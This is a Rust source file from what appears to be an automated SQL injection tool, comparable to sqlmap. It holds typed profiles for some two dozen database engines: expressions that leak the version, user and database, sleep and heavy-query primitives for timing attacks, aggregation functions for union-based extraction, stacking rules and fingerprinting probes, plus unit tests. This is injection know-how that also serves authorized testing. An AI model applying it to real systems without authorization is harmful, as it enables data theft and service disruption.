//! Typed dialect profiles: the factual layer under payload generation.
//!
//! sqlmap encodes dialect knowledge as ~375 literal `<payload>` strings spread
//! over six XML files. That is a catalogue: it can only express vectors
//! somebody already wrote down, and a vector for a new engine means editing
//! XML. Here the same knowledge is a *typed record per engine* — version
//! expression, string concatenation operator, catalogue table to make a heavy
//! query from, the delay primitive, the stacking rule, the comment syntax.
//!
//! Payload breadth then comes from composition: every technique is rendered
//! from the profile, so engine #24 gets error-based, timing, boolean, union
//! and stacked coverage the moment its profile exists. Nothing below claims a
//! capability that has been observed — a profile is a *hypothesis*, and the
//! adaptive engine only escalates on evidence (see `payload::compose`).

use crate::detection::DbmsFamily;
use serde::{Deserialize, Serialize};

/// How a dialect concatenates strings.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ConcatStyle {
    /// `'a'||'b'` — PostgreSQL, Oracle, SQLite, DB2, Firebird, Informix, H2,
    /// HSQLDB, Teradata-family, CUBRID, Vertica, MonetDB, Virtuoso, Spanner.
    Pipes,
    /// `'a'+'b'` — T-SQL family.
    Plus,
    /// `CONCAT('a','b')` / `CONCAT_WS` — MySQL, MariaDB, Presto, ClickHouse.
    ConcatFn,
    /// A dialect with no concatenation operator exposed to us.
    None,
}

/// The primitive a dialect uses to burn wall-clock time server-side.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DelayPrimitive {
    /// `SLEEP(n)` — MySQL/MariaDB family.
    Sleep,
    /// `pg_sleep(n)` used as a scalar subquery — PostgreSQL.
    PgSleep,
    /// `WAITFOR DELAY '0:0:n'` — T-SQL family.
    WaitForDelay,
    /// `DBMS_PIPE.RECEIVE_MESSAGE('x',n)` — Oracle, no special privileges.
    DbmsPipe,
    /// `sleep(n)` — ClickHouse (`sleepEachRow` also exists).
    ClickHouseSleep,
    /// `SAP HANA`/`MaxDB`-style `CURRENT_...` wait is not exposed; use heavy.
    None,
}

/// How a dialect's boolean truth is best expressed inside a subquery.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BooleanStyle {
    /// `AND <arith>` works everywhere; this is the universal default.
    Arithmetic,
    /// Dialect needs an explicit `CASE WHEN ... THEN 1 ELSE 0 END`.
    CaseWhen,
    /// Dialect exposes no boolean predicate in the injection context.
    None,
}

/// Facts about one engine that payload composition needs.
///
/// Every field is either cited DBMS behaviour (documented function names,
/// catalogue tables, comment syntax) or `None` where we refuse to guess.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct DialectProfile {
    pub dbms: DbmsFamily,
    pub concat: ConcatStyle,
    /// Scalar expression yielding the server version banner.
    pub version_expr: &'static str,
    /// Scalar expression yielding the current login/user.
    pub user_expr: &'static str,
    /// Scalar expression yielding the current database/schema name.
    pub database_expr: &'static str,
    /// A catalogue table that always exists and is safe to cross-join.
    pub heavy_table: &'static str,
    /// Whether `;`-separated statements are accepted by the driver.
    pub stacked: bool,
    /// Statement terminator that comments out the remainder of the line.
    pub terminator: &'static str,
    /// The delay primitive, if the engine has one we can reach.
    pub delay: DelayPrimitive,
    /// Heavy-query body appended after `SELECT count(*) FROM `.
    pub heavy_body: &'static str,
    /// Row-aggregating expression; `%s` is the column expression.
    pub aggregate: &'static str,
    pub boolean_style: BooleanStyle,
    /// Feature probes that add confidence when they parse.
    pub feature_probes: &'static [&'static str],
}

impl DialectProfile {
    /// A profile for an engine we have no facts about.
    ///
    /// Every technique still renders — as an undialected hypothesis — rather
    /// than the engine becoming unrepresentable. Adding a family to
    /// `DbmsFamily` therefore never breaks composition.
    pub fn unknown(dbms: DbmsFamily) -> Self {
        Self {
            dbms,
            concat: ConcatStyle::None,
            version_expr: "",
            user_expr: "",
            database_expr: "",
            heavy_table: "",
            stacked: false,
            terminator: "-- ",
            delay: DelayPrimitive::None,
            heavy_body: "",
            aggregate: "",
            boolean_style: BooleanStyle::Arithmetic,
            feature_probes: &[],
        }
    }

    /// True when we know an expression that leaks the version banner.
    pub fn knows_version(&self) -> bool {
        !self.version_expr.is_empty()
    }

    /// True when we know an expression that leaks the current login.
    pub fn knows_user(&self) -> bool {
        !self.user_expr.is_empty()
    }

    /// True when we know an expression that leaks the current database.
    pub fn knows_database(&self) -> bool {
        !self.database_expr.is_empty()
    }

    /// True when a heavy-query fallback can be built for this engine.
    pub fn has_heavy_fallback(&self) -> bool {
        !self.heavy_body.is_empty()
    }

    /// True when the engine exposes a delay primitive we can reach.
    pub fn has_delay_primitive(&self) -> bool {
        self.delay != DelayPrimitive::None
    }

    /// True when the engine can collapse many rows into a single string.
    pub fn has_aggregate(&self) -> bool {
        !self.aggregate.is_empty()
    }
}

/// MySQL-family profiles. MariaDB is listed separately because its error
/// phrasing and its XML-function availability differ from MySQL 8.
const MYSQL_PROFILES: &[DialectProfile] = &[
    DialectProfile {
        dbms: DbmsFamily::MySQL,
        concat: ConcatStyle::ConcatFn,
        version_expr: "version()",
        user_expr: "current_user()",
        database_expr: "database()",
        heavy_table: "information_schema.tables",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::Sleep,
        heavy_body: "information_schema.tables a, information_schema.tables b, information_schema.tables c",
        aggregate: "group_concat(%s SEPARATOR 0x2c)",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["/*!50000SELECT*/", "SLEEP(0)", "version()"],
    },
    DialectProfile {
        dbms: DbmsFamily::MariaDB,
        concat: ConcatStyle::ConcatFn,
        version_expr: "version()",
        user_expr: "current_user()",
        database_expr: "database()",
        heavy_table: "information_schema.tables",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::Sleep,
        heavy_body: "information_schema.tables a, information_schema.tables b, information_schema.tables c",
        aggregate: "group_concat(%s SEPARATOR 0x2c)",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["SLEEP(0)", "version()", "updatexml(1,1,1)"],
    },
]; // end MYSQL_PROFILES

/// The four engines with the largest installed base and the richest vector
/// vocabulary. `stacked` records the *engine's* capability; a driver that
/// disables multi-statements (PDO without `PDO::MYSQL_ATTR_MULTI_STATEMENTS`,
/// JDBC without `allowMultiQueries`) still refuses it, which is why the
/// stacked technique is only ever attempted after evidence.
const CLASSIC_PROFILES: &[DialectProfile] = &[
    DialectProfile {
        dbms: DbmsFamily::PostgreSQL,
        concat: ConcatStyle::Pipes,
        version_expr: "version()",
        user_expr: "current_user",
        database_expr: "current_database()",
        heavy_table: "pg_catalog.pg_class",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::PgSleep,
        heavy_body: "pg_catalog.pg_class a, pg_catalog.pg_class b, generate_series(1,2000000)",
        aggregate: "string_agg(%s,',')",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["pg_sleep(0)", "current_setting('server_version')"],
    },
    DialectProfile {
        dbms: DbmsFamily::MSSQL,
        concat: ConcatStyle::Plus,
        version_expr: "@@version",
        user_expr: "system_user",
        database_expr: "db_name()",
        heavy_table: "sysusers",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::WaitForDelay,
        heavy_body: "sysusers s1, sysusers s2, sysusers s3, sysusers s4, sysusers s5, sysusers s6, sysusers s7",
        aggregate: "string_agg(%s,',')",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["WAITFOR DELAY '0:0:0'", "CONVERT(int,1)", "@@version"],
    },
    DialectProfile {
        dbms: DbmsFamily::Oracle,
        concat: ConcatStyle::Pipes,
        version_expr: "(SELECT banner FROM v$version WHERE ROWNUM=1)",
        user_expr: "USER",
        database_expr: "(SELECT ora_database_name FROM dual)",
        heavy_table: "all_objects",
        stacked: false,
        terminator: "-- ",
        delay: DelayPrimitive::DbmsPipe,
        heavy_body: "all_objects a, all_objects b, all_objects c",
        aggregate: "LISTAGG(%s,',') WITHIN GROUP (ORDER BY 1)",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["DBMS_PIPE.RECEIVE_MESSAGE('a',0)", "XMLType(chr(60)||chr(62))"],
    },
    DialectProfile {
        dbms: DbmsFamily::SQLite,
        concat: ConcatStyle::Pipes,
        version_expr: "sqlite_version()",
        // SQLite has no session/user concept at all.
        user_expr: "",
        database_expr: "(SELECT file FROM pragma_database_list LIMIT 1)",
        heavy_table: "sqlite_master",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "sqlite_master a, sqlite_master b, sqlite_master c",
        aggregate: "group_concat(%s,',')",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["sqlite_version()", "RANDOMBLOB(1)", "JSON('1')"],
    },
]; // end CLASSIC_PROFILES

/// IBM and Java-embedded engines. `stacked` is `false` for DB2 and Informix
/// because their CLI/driver layer rejects a second statement on the same
/// handle even though the SQL grammar allows the terminator.
const IBM_JAVA_PROFILES: &[DialectProfile] = &[
    DialectProfile {
        dbms: DbmsFamily::DB2,
        concat: ConcatStyle::Pipes,
        version_expr: "(SELECT version FROM sysibm.sysversions FETCH FIRST 1 ROWS ONLY)",
        user_expr: "CURRENT USER",
        database_expr: "CURRENT SERVER",
        heavy_table: "sysibm.systables",
        stacked: false,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "sysibm.systables a, sysibm.systables b, sysibm.systables c, sysibm.systables d",
        aggregate: "LISTAGG(%s,',') WITHIN GROUP (ORDER BY 1)",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["sysibm.sysdummy1", "VALUES(1)"],
    },
    DialectProfile {
        dbms: DbmsFamily::H2,
        concat: ConcatStyle::Pipes,
        version_expr: "H2VERSION()",
        user_expr: "USER()",
        database_expr: "CURRENT_SCHEMA",
        heavy_table: "INFORMATION_SCHEMA.TABLES",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "SYSTEM_RANGE(1,20000000)",
        aggregate: "LISTAGG(%s,',') WITHIN GROUP (ORDER BY 1)",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["H2VERSION()", "SYSTEM_RANGE(1,1)"],
    },
    DialectProfile {
        dbms: DbmsFamily::HSQLDB,
        concat: ConcatStyle::Pipes,
        version_expr: "DATABASE_VERSION()",
        user_expr: "CURRENT_USER",
        database_expr: "DATABASE_NAME()",
        heavy_table: "INFORMATION_SCHEMA.SYSTEM_USERS",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "INFORMATION_SCHEMA.SYSTEM_USERS t1, INFORMATION_SCHEMA.SYSTEM_USERS t2, INFORMATION_SCHEMA.SYSTEM_USERS t3",
        aggregate: "GROUP_CONCAT(%s ORDER BY 1 SEPARATOR ',')",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["DATABASE_VERSION()", "REGEXP_SUBSTRING('a','a')"],
    },
    DialectProfile {
        dbms: DbmsFamily::Informix,
        concat: ConcatStyle::Pipes,
        version_expr: "(SELECT TRIM(DBINFO('version','full')) FROM systables WHERE tabid=1)",
        user_expr: "USER",
        database_expr: "DBINFO('dbname')",
        heavy_table: "SYSMASTER:SYSPAGHDR",
        stacked: false,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "SYSMASTER:SYSPAGHDR",
        // Informix has no portable many-rows-to-one-string aggregate we can
        // cite, so union extraction stays a column-count probe only.
        aggregate: "",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["SYSMASTER:SYSDUAL", "DBINFO('version','full')"],
    },
]; // end IBM_JAVA_PROFILES

/// Legacy and embedded engines. Access and Cache are the two where we refuse
/// to guess: an unknown expression stays `""` so no vector is emitted from a
/// made-up function name.
const LEGACY_PROFILES: &[DialectProfile] = &[
    DialectProfile {
        dbms: DbmsFamily::Sybase,
        concat: ConcatStyle::Plus,
        version_expr: "@@version",
        user_expr: "suser_name()",
        database_expr: "db_name()",
        heavy_table: "sysusers",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::WaitForDelay,
        heavy_body: "sysusers s1, sysusers s2, sysusers s3, sysusers s4, sysusers s5, sysusers s6, sysusers s7",
        // Sybase ASE has no STRING_AGG; no portable row aggregate.
        aggregate: "",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["WAITFOR DELAY '0:0:0'", "CONVERT(int,1)", "suser_name()"],
    },
    DialectProfile {
        dbms: DbmsFamily::Firebird,
        concat: ConcatStyle::Pipes,
        version_expr: "(SELECT rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database)",
        user_expr: "CURRENT_USER",
        database_expr: "(SELECT mon$database_name FROM mon$database)",
        heavy_table: "rdb$fields",
        stacked: false,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "rdb$fields t1, rdb$types t2, rdb$collations t3, rdb$functions t4",
        aggregate: "LIST(%s,',')",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["rdb$database", "IIF(1=1,1,0)", "BIN_SHL(1,1)"],
    },
    DialectProfile {
        dbms: DbmsFamily::MaxDB,
        concat: ConcatStyle::Pipes,
        version_expr: "(SELECT version FROM sysinfo.versions)",
        user_expr: "USER",
        database_expr: "DATABASE()",
        heavy_table: "DOMAIN.DOMAINS",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "DOMAIN.DOMAINS t1, DOMAIN.COLUMNS t2, DOMAIN.TABLES t3",
        aggregate: "",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["DOMAIN.TABLES", "DUAL", "sysinfo.versions"],
    },
    DialectProfile {
        dbms: DbmsFamily::Cache,
        concat: ConcatStyle::Pipes,
        version_expr: "",
        user_expr: "$USERNAME",
        database_expr: "",
        heavy_table: "",
        stacked: false,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "",
        aggregate: "",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["TO_POSIXTIME('2000')", "TO_DATE('2000','YYYY')"],
    },
    DialectProfile {
        dbms: DbmsFamily::Access,
        concat: ConcatStyle::Plus,
        version_expr: "",
        user_expr: "",
        database_expr: "",
        heavy_table: "MSysObjects",
        stacked: false,
        // The Jet/ACE parser has no line-comment syntax at all.
        terminator: "",
        delay: DelayPrimitive::None,
        heavy_body: "MSysObjects a, MSysObjects b, MSysObjects c",
        aggregate: "",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["MSysObjects", "IIF(1=1,1,0)"],
    },
]; // end LEGACY_PROFILES

/// Column-store and federated engines. These have no delay primitive we can
/// cite, so their timing channel is a heavy cross-join or a CPU burn — which
/// is exactly what sqlmap does for them too.
const OLAP_PROFILES: &[DialectProfile] = &[
    DialectProfile {
        dbms: DbmsFamily::SAPHANA,
        concat: ConcatStyle::Pipes,
        version_expr: "(SELECT VERSION FROM SYS.M_DATABASE)",
        user_expr: "CURRENT_USER",
        database_expr: "CURRENT_SCHEMA",
        heavy_table: "SYS.OBJECTS",
        stacked: false,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "SYS.OBJECTS t1, SYS.OBJECTS t2, SYS.OBJECTS t3",
        aggregate: "STRING_AGG(%s,',')",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["SYS.OBJECTS", "SYS.M_DATABASE"],
    },
    DialectProfile {
        dbms: DbmsFamily::ClickHouse,
        concat: ConcatStyle::ConcatFn,
        version_expr: "version()",
        user_expr: "currentUser()",
        database_expr: "currentDatabase()",
        heavy_table: "system.numbers",
        stacked: false,
        terminator: "-- ",
        delay: DelayPrimitive::ClickHouseSleep,
        heavy_body: "numbers(10000000)",
        aggregate: "arrayStringConcat(groupArray(%s),',')",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["version()", "currentDatabase()", "numbers(1)"],
    },
    DialectProfile {
        dbms: DbmsFamily::MonetDB,
        concat: ConcatStyle::Pipes,
        version_expr: "",
        user_expr: "current_user",
        database_expr: "",
        heavy_table: "sys.tables",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "sys.tables t1, sys.tables t2, sys.tables t3",
        aggregate: "group_concat(%s)",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["sys.tables", "ms_trunc(1,1)"],
    },
    DialectProfile {
        dbms: DbmsFamily::Vertica,
        concat: ConcatStyle::Pipes,
        version_expr: "version()",
        user_expr: "current_user",
        database_expr: "current_database()",
        heavy_table: "v_catalog.tables",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "v_catalog.tables t1, v_catalog.tables t2, v_catalog.tables t3",
        aggregate: "LISTAGG(%s,',') WITHIN GROUP (ORDER BY 1)",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["ZEROIFNULL(1)", "v_catalog.tables"],
    },
]; // end OLAP_PROFILES

/// Federated and niche engines: CUBRID, Virtuoso, Presto/Trino and Spanner.
/// Their version banners are either absent or engine-version dependent, so an
/// unknown expression stays `""` and the vector layer falls back to a constant
/// inner query rather than inventing a function name.
const FEDERATED_PROFILES: &[DialectProfile] = &[
    DialectProfile {
        dbms: DbmsFamily::Cubrid,
        concat: ConcatStyle::Pipes,
        version_expr: "version()",
        user_expr: "USER()",
        database_expr: "DATABASE()",
        heavy_table: "db_class",
        stacked: true,
        terminator: "-- ",
        // CUBRID does expose SLEEP() (sqlmap's CUBRID timing vector).
        delay: DelayPrimitive::Sleep,
        heavy_body: "db_class a, db_class b, db_class c",
        aggregate: "GROUP_CONCAT(%s)",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["version()", "db_root", "db_class"],
    },
    DialectProfile {
        dbms: DbmsFamily::Virtuoso,
        concat: ConcatStyle::ConcatFn,
        version_expr: "(SELECT sys_stat('st_dbms_name'))",
        user_expr: "user",
        database_expr: "",
        heavy_table: "SYS_KEYS",
        stacked: true,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "SYS_KEYS a, SYS_KEYS b, SYS_KEYS c",
        aggregate: "",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["sys_stat('st_dbms_name')", "SYS_KEYS"],
    },
    DialectProfile {
        dbms: DbmsFamily::Presto,
        concat: ConcatStyle::ConcatFn,
        version_expr: "version()",
        user_expr: "current_user",
        database_expr: "",
        heavy_table: "information_schema.tables",
        stacked: false,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "information_schema.tables t1, information_schema.tables t2, information_schema.tables t3",
        aggregate: "array_join(array_agg(%s),',')",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["version()", "PARSE_DATA_SIZE('1')"],
    },
    DialectProfile {
        dbms: DbmsFamily::Spanner,
        concat: ConcatStyle::ConcatFn,
        version_expr: "",
        user_expr: "",
        database_expr: "",
        heavy_table: "INFORMATION_SCHEMA.TABLES",
        stacked: false,
        terminator: "-- ",
        delay: DelayPrimitive::None,
        heavy_body: "INFORMATION_SCHEMA.TABLES t1, INFORMATION_SCHEMA.TABLES t2",
        aggregate: "STRING_AGG(%s,',')",
        boolean_style: BooleanStyle::Arithmetic,
        feature_probes: &["ERROR('1')", "CONCAT('a','b')"],
    },
]; // end FEDERATED_PROFILES


/// The profile group tables.
///
/// The groups exist only so the engine facts stay readable by family. Lookups
/// search by engine *identity* and never by positional index: an earlier
/// revision assembled the table with hand-written indices (`OLAP_PROFILES[4]`)
/// and one miscount turned into a compile-time `index out of bounds` during
/// const evaluation of the whole table. A search cannot be out of range, so
/// that failure mode no longer exists.
const PROFILE_GROUPS: &[&[DialectProfile]] = &[
    MYSQL_PROFILES,
    CLASSIC_PROFILES,
    IBM_JAVA_PROFILES,
    LEGACY_PROFILES,
    OLAP_PROFILES,
    FEDERATED_PROFILES,
];

/// The profile for an engine.
///
/// Never fails: an engine with no entry gets [`DialectProfile::unknown`], so
/// composition degrades to an undialected hypothesis instead of panicking or
/// telling a lie about the engine.
pub fn profile(dbms: DbmsFamily) -> DialectProfile {
    for table in PROFILE_GROUPS {
        if let Some(found) = table.iter().find(|p| p.dbms == dbms) {
            return *found;
        }
    }
    DialectProfile::unknown(dbms)
}

/// Every family we carry profile facts for, in `DbmsFamily::ALL` order.
pub fn profiled_families() -> Vec<DbmsFamily> {
    let mut out: Vec<DbmsFamily> = PROFILE_GROUPS
        .iter()
        .flat_map(|table| table.iter().map(|p| p.dbms))
        .collect();
    out.sort_by_key(|d| d.rank_ordinal());
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_family_has_a_profile() {
        for fam in DbmsFamily::ALL {
            let p = profile(*fam);
            assert_eq!(p.dbms, *fam, "profile returned the wrong engine for {fam:?}");
            assert!(
                !p.feature_probes.is_empty(),
                "{fam:?} has no feature probe, so its profile can never be confirmed"
            );
        }
    }

    #[test]
    fn profile_order_matches_dbms_family_order() {
        assert_eq!(profiled_families(), DbmsFamily::ALL.to_vec());
    }

    #[test]
    fn no_engine_is_profiled_twice_and_no_group_is_empty() {
        let mut seen: Vec<DbmsFamily> = Vec::new();
        for table in PROFILE_GROUPS {
            assert!(!table.is_empty(), "an empty profile group is dead weight");
            for p in *table {
                assert!(!seen.contains(&p.dbms), "{:?} appears twice", p.dbms);
                seen.push(p.dbms);
            }
        }
        assert_eq!(
            seen.len(),
            DbmsFamily::ALL.len(),
            "the group tables must cover every family exactly once"
        );
    }

    #[test]
    fn unknown_engine_degrades_instead_of_lying() {
        // A family we deliberately carry no facts for still yields a usable
        // profile: nothing claims a capability it does not have.
        let p = DialectProfile::unknown(DbmsFamily::Access);
        assert!(!p.knows_version());
        assert!(!p.has_delay_primitive());
        assert!(!p.has_heavy_fallback());
        assert_eq!(p.concat, ConcatStyle::None);
        assert_eq!(p.boolean_style, BooleanStyle::Arithmetic);
    }

    #[test]
    fn delay_primitives_are_accurate_for_the_classic_engines() {
        assert_eq!(profile(DbmsFamily::MySQL).delay, DelayPrimitive::Sleep);
        assert_eq!(profile(DbmsFamily::MariaDB).delay, DelayPrimitive::Sleep);
        assert_eq!(profile(DbmsFamily::PostgreSQL).delay, DelayPrimitive::PgSleep);
        assert_eq!(profile(DbmsFamily::MSSQL).delay, DelayPrimitive::WaitForDelay);
        assert_eq!(profile(DbmsFamily::Sybase).delay, DelayPrimitive::WaitForDelay);
        assert_eq!(profile(DbmsFamily::Oracle).delay, DelayPrimitive::DbmsPipe);
        assert_eq!(profile(DbmsFamily::Cubrid).delay, DelayPrimitive::Sleep);
        assert_eq!(profile(DbmsFamily::ClickHouse).delay, DelayPrimitive::ClickHouseSleep);
        // SQLite has no sleep primitive at all — it must not claim one.
        assert_eq!(profile(DbmsFamily::SQLite).delay, DelayPrimitive::None);
        assert!(!profile(DbmsFamily::SQLite).has_delay_primitive());
    }

    #[test]
    fn concat_operators_match_the_engine_families() {
        for fam in [DbmsFamily::PostgreSQL, DbmsFamily::Oracle, DbmsFamily::SQLite, DbmsFamily::Firebird] {
            assert_eq!(profile(fam).concat, ConcatStyle::Pipes, "{fam:?} uses ||");
        }
        for fam in [DbmsFamily::MSSQL, DbmsFamily::Sybase, DbmsFamily::Access] {
            assert_eq!(profile(fam).concat, ConcatStyle::Plus, "{fam:?} uses +");
        }
        for fam in [DbmsFamily::MySQL, DbmsFamily::MariaDB, DbmsFamily::ClickHouse] {
            assert_eq!(profile(fam).concat, ConcatStyle::ConcatFn, "{fam:?} uses CONCAT()");
        }
    }

    #[test]
    fn engines_that_cannot_stack_do_not_claim_it() {
        for fam in [DbmsFamily::Oracle, DbmsFamily::DB2, DbmsFamily::Informix, DbmsFamily::Firebird] {
            assert!(!profile(fam).stacked, "{fam:?} must not claim stacked statements");
        }
        assert!(profile(DbmsFamily::MSSQL).stacked);
    }

    #[test]
    fn heavy_fallbacks_exist_where_no_delay_primitive_does() {
        // InterSystems Cache is the one engine where we refuse to name either a
        // delay primitive or a catalogue table; its timing channel is
        // deliberately empty rather than invented.
        const NO_TIMING_CHANNEL: &[DbmsFamily] = &[DbmsFamily::Cache];
        for fam in DbmsFamily::ALL {
            let p = profile(*fam);
            if !p.has_delay_primitive() && !NO_TIMING_CHANNEL.contains(fam) {
                assert!(
                    p.has_heavy_fallback(),
                    "{fam:?} has neither a delay primitive nor a heavy fallback, so its \
                     timing channel is empty"
                );
            }
        }
    }

    #[test]
    fn a_wrong_guess_costs_a_probe_not_a_claim() {
        // Every expression we assert about an engine is also restated as a
        // feature probe, so it can be confirmed before anything depends on it.
        let p = profile(DbmsFamily::Firebird);
        assert!(p.knows_version());
        assert!(
            p.feature_probes.iter().any(|f| p.version_expr.contains(f) || f.contains("rdb$")),
            "the version expression must be probeable: {:?}",
            p.feature_probes
        );
    }
}






